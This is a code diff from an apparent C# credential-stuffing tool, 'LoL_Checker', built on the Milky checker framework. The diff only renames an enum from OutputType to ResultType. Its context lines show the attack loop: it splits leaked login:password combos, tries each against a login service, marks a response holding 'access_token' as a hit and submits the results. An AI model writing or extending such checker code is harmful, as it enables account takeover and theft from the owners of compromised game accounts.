@@ -44,14 +44,14 @@ namespace LoL_Checker
                 {
                     string[] splittedCombo = combo.Split(':');
 
-                    OutputType outputType = OutputType.Invalid;
+                    ResultType resultType = ResultType.Invalid;
 
                     if (splittedCombo.Length == 2)
                     {
                         string login = splittedCombo[0];
                         string password = splittedCombo[1];
 
-                        while (outputType != OutputType.Hit)
+                        while (resultType != ResultType.Hit)
                         {
                             try
                             {
@@ -65,7 +65,7 @@ namespace LoL_Checker
                                 request.Dispose();
 
                                 if (response.Contains("access_token"))
-                                    outputType = OutputType.Hit;
+                                    resultType = ResultType.Hit;
                                 else if (response.Contains("invalid_credentials"))
                                     break;
                             }
@@ -73,7 +73,7 @@ namespace LoL_Checker
                         }
                     }
 
-                    Milky.RunManager.SubmitComboResult(combo, outputType);
+                    Milky.RunManager.SubmitComboResult(combo, resultType);
                 });
 
                 Milky.RunManager.FinishRun();
